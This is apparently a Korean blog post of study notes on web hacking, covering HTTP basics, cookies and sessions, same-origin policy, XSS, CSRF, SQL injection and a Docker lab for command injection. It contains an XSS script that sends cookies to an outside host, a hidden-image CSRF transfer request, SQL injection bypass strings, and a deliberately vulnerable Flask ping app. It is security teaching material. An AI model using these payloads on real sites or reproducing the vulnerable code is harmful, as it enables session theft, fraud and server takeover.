---
layout: default
title: "Web Hacking 학습 정리"
date: 2026-05-19
categories: Hacking
---

## Web basic knowledge
- 웹 리소스: HTML, CSS, JS(Client-Side Script), Other(Image, Document, Video ...)
- URL/URI
    - Uniform: 리소스를 식별하는 통일된 방식
    - Resource: HTML, CSS, JS 외 이미지 등 리소스를 지칭
    - Identifier: 다른 항목과 구분하기 위한 정보
    - Locator: 리소스의 위치를 나타내기 위한 정보
    - https://kknock.org -> URL/URI
        - URI: kknock.org/path?pos=home
        - URL: https://kknock.org/path?pos=home
        - URN(Uniform Resource Name): /path?pos=home
    - https(`schema`)://kknock.org:8080(`authority`)/login(`path`)?id=user(`query`)#name(`fragment`)
- **Fragment**는 *메인* 리소스에 존재하는 *서브* 리소스에 접근할때 이를 식별하기 위한 정보를 담고있다.
- **HTTP 헤더 (HTTP Header)**: HTTP 헤더의 각 줄은 `CRLF`로 구분되며, 첫 줄은 `Start Line`, 나머지 줄은 `Header`라고 부른다. 헤더의 끝 줄은 빈 줄로 나타냄
- **CRLF**: `CR(Carriage Return)`과 `LF(Line Feed)`의 조합을 나타냄 **CR**은 커서를 현재 줄의 맨 앞으로 이동시키는 문자, **LF**는 커서 다음 줄로 이동시키는 문자이다.
- 윈도우에서는 줄을 종결하기 위해 `CRLF`를 사용하고, 리눅스나 유닉스 기반 운영체제에서는 `LF`만을 사용함.
- **HTTP 요청의 시작줄**은 `메소드(Method)`, `요청 대상(Request Target)`, `HTTP 버전`으로 구성된다. (POST /login HTTP/1.1)

---

## Cookie & Session
- Cookie: Key와 Value로 이뤄진 단위
    - 서버가 클라이언트에게 쿠키를 발급 -> 클라이언트는 서버에게 요청 보낼때마다 Cookie를 같이 전송.
    - 예시: 팝업 중 `7일 간 표시하지 않기` 버튼을 누르면 쿠키에 해당 정보를 기록. 요청 시 해당 Cookie를 같이 전송해 팝업창 표시 여부를 판단.
    - 쿠키를 통해 인증정보를 기록하기도 함
- Session: 클라이언트 인증 정보를 변조할 수 없게 하기 위해 인증 정보(auth info)를 서버에 저장, `해당 데이터를 접근할 수 있는 키(랜덤한 문자열)`를 클라이언트에게 전달하는 방식. 해당 키를 일반적으로 `Session ID`라고 한다.
    - Cookie Example: `나 육군 참모총장인데 들여보내줘.` <-`(암구호)`-> `충성! 참모총장님 들어가십시오.`
    - Session Example: `나 아까 그 참모총장인데 들여보내줘.` -> `죄송하지만 피아식별 띠(Session ID)가 없으므로 출입이 불가능 하십니다.`
>```html
><script>
>document.cookie = "key=value";
></script>
>```
- **SOP(Same Origin Policy)**: 동일 출처 정책으로서 보안 메커니즘이다. 이걸 사용하는 이유는 *브라우저는 웹 리소스를 통해 간접적으로 `타 사이트를 접근할때`도 인증 정보인 쿠키를 함께 전송하는 특징때문이다.*
    - 이 SOP를 적용하게 되면 `스키마`, `호스트`, `포트`만 달라도 Cross Origin으로 인식하게 된다. 오로지 Path만 허용하게 된다.
    - 예를들어 `https://dreamhack.io` 이라는 사이트에 접속하여 밑에 있는 명령어를 입력하게 되면 SOP가 적용되어 있는 사이트의 경우 `Origin 오류`가 생긴다.
>```javascript
>crossNewWindow = window.open('https://kknock.org');
>console.log(crossNewWindow.location.href);
>```
> ![IMAGE](/assets/images/Web/image01.png)
- 하지만 밑의 명령어 처럼 데이터를 쓰는것은 문제없이 동작한다.
>```javascript
>crossNewWindow = window.open('https://kknock.org');
>crossNewWindow.location.href = "https://dreamhack.io";
>```
> ![IMAGE](/assets/images/Web/image02.png)
- 사이트의 호스트가 달라 SOP때문에 정보를 교환하지 못할때 이러한 Cross Origin 정책을 완화시켜주는 방식은 `CORS(Cross Origin Resource Sharing)`이다.

---

## Cross-Site-Scripting (XSS)
- **XSS**: Client-Side 취약점, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 실행할 수 있도록하는 공격 기법.
- **Stored XSS**: `악성 스크립트가 서버에 저장`되고 `서버 응답에 담겨오는` XSS
- **Reflected XSS**: `악성 스크립트가 URL에 저장`되고 `서버 응답에 담겨오는` XSS
- **DOM-Based XSS**: `악성 스크립트가 URL Fragment에 저장`되는 XSS
- **Universal XSS**: 브라우저 플러그인 취약점으로 `SOP 정책을 우회하는` XSS
#### XSS Script
>```html
><script>
>document.cookie;
>alert(document.cookie);
>new Image().src = "https://kknock.org?cookie=" + document.cookie;
>document.write = "You have been Hacked!";
></script>
>
><img src="XSS" onerror="location.href = '?cookie=' + document.cookie">
>```

---

## Cross Site Request Forgery (CSRF)
- **CSRF**: Request 변조로써 로그인 된 사용자가 자신의 의지와 무관하게 공격자가 의도한 행동(송금, 비밀번호 변경 등)을 특정 웹사이트에 요청하게 만드는 웹 보안 취약점 공격이다.
    - `GET /sendmoney?to=nullbins?amount=10000 HTTP/1.1`
- CSRF Script
    >```html
    ><img src='https://kknock.org/sendmoney?to=nullbins&amount=10000' width=0px height=0px>
    >```

---

## SQL Injection
- DDL(Data Denfinition Language): 데이터를 정의 (`CREATE`, `ALTER`, `DROP`, `TRUNCATE`, `RENAME`)
    >```sql
    >CREATE DATABASE kknock_web;
    >USE kknock_web;
    >CREATE TABLE users(
    >    username varchar(100) PRIMARY KEY, NOT NULL,
    >    password varchar(100) NOT NULL
    >);
    >```
- DML(Data Manipulcation Language): 데이터를 조작 (`SELECT`, `INSERT`, `UPDATE`, `DELETE`)
    >```sql
    >INSERT INTO users (username, password) VALUES ('nullbins','password');
    >```
- DCL(Data Control Language): 데이터를 제어 (`GRANT`, `REVOKE`)
    >```sql
    >GRANT ALL PRIVILEGES on *.* to 'root'@'%' identified by 'password';
    >GRANT SELECT, INSERT on kknock_web.users to 'kknock_user'@'192.168.10.10';
    >```
- **SQL Injection**: 공격자가 악의적인 SQL 구문을 삽입하여 DB(데이터베이스)를 비정상적으로 조작하는 공격기법이다.
    - SQL Injection의 원인: 사용자 입력 데이터의 검증 및 정제 부족
    - SQL Injection 공격 예제
        > SQL 인증 쿼리 예시
        >```sql
        >SELECT * FROM users WHERE username='$user' AND password='$password';
        >```
        >```text
        >admin' --
        >```
        >```sql
        >SELECT * FROM users WHERE username='admin' --' AND password='$password';
        >```
        >```text
        >admin' #
        >```
        >```sql
        >SELECT * FROM users WHERE username='admin' #' AND password='$password';
        >```
        >```text
        >' OR '1'='1
        >```
        >```sql
        >SELECT * FROM users WHERE username='' OR '1'='1' AND password='$password';
        >```
        >```text
        >'+(SELECT password FROM users WHERE username='admin')+'
        >```
        >```sql
        >SELECT * FROM users WHERE username='admin' AND password=''+(SELECT password FROM users WHERE username='admin')+'';
        >```
    - Blind SQL Injection 공격 예제
        - substr(string, position, length)
        >```text
        >admin' AND substr(password, 1, 1) = "p" --
        >```
        >```sql
        >SELECT * FROM users WHERE username='admin' AND substr(password, 1, 1) = "p" --' AND password='$password';
        >```
        > ![IMAGE](/assets/images/Web/image03.png)
    - 파이썬 requests 모듈
        ```text
        pip install requests
        ```
        >```python
        >#!/usr/bin/python3
        >import requests
        >get = requests.get(url, headers=headers, params=params)
        >post = requests.post(url, headers=headers, params=params)
        >```
- SQL DML
    - `ORDER BY`: 원하는 컬럼 기준으로 정렬
    - `LIMIT`: 조회한 결과에서 행의 갯수와 offset 지정
    - `ASC`: 오름차순
    - `DESC`: 내림차순
- SQL Feature
    - `UNION`: 두 개 이상의 `SELECT` 쿼리를 하나의 결과 집합으로 합쳐주는 집합 연사자임

---

## Command Injection
**Command Injection**: 사용자의 입력을 시스템 명령어로 실행하게 하는 취약점
#### Command Injection 실습 (Docker 환경 구축)
> [ app.py ]
>```python
>from flask import Flask, render_template, request
>import os
>
>app = Flask(__name__)
>
>flag_path = "/flag.txt"
>with open(flag_path, "w", encoding="utf-8") as flag:
>    flag.write("NULLBINS{" + os.urandom(32).hex() + "}")
>
>@app.route('/')
>def index():
>    return f"<h1>Welcome to Web Site</h1><p>Current path: {request.path}</p>"
>
>@app.route('/ping', methods=['GET', 'POST'])
>def ping():
>    ip = request.form.get("ip", "")
>    cmd = f"ping -c 1 {ip}"
>    result = os.popen(cmd).read()
>    return f"""
>            <h2>Command</h2>
>            <div class="cmd"><form action="/ping" method="POST">
>            <input type="text" name="ip" id="ip" placeholder="127.0.0.1"/><input type="submit" value="enter"/>
>            </form></div>
>            <pre>{cmd}</pre><h2>Result</h2><pre>{result}</pre>
>            """
>
>if __name__ == '__main__':
>    app.run(host="0.0.0.0", port=5000)
>```
> [ Dockerfile ]
>```Dockerfile
>FROM alpine:latest
>
>RUN apk add --no-cache python3 py3-pip iputils
>RUN pip3 install flask --break-system-packages
>
>WORKDIR /app
>COPY app.py .
>
>EXPOSE 5000
>CMD ["python3", "app.py"]
>```
> [ docker-compose.yaml ]
>```yaml
>services:
>  rce-server:
>    build:
>      context: .
>      dockerfile: Dockerfile
>    image: rce-server:v1
>    container_name: rce-server
>    hostname: rce-server
>    restart: always
>    networks:
>      docker-network:
>        ipv4_address: 192.168.10.100
>networks:
>  docker-network:
>    external: true
>```
> [ rc.local ]
>```vim
># Virtual Network Bridge
>ip link add docknet link ens32 type macvlan mode bridge
>ip addr add 192.168.10.254/24 dev docknet
>ip link set docknet up
>ip route add 192.168.10.0/24 dev docknet
>ip addr show docknet | grep "inet"
>ip route show | grep "docknet"
>```
```vim
docker network create -d macvlan --subnet 192.168.10.0/24 --gateway 192.168.10.2 -o parent=ens32 docker-network
docker compose up -d --build
```
> ![IMAGE](/assets/images/Web/image04.png)
> ![IMAGE](/assets/images/Web/image05.png)

## File Vulnerability
- **File 업로드 취약점**: 악성 확장자를 갖는 파일을 업로드 하는 행위 (Webshell 등)
- **File 다운로드 취약점**: 서버의 민감한 파일이나 자료를 다운받는 행위

---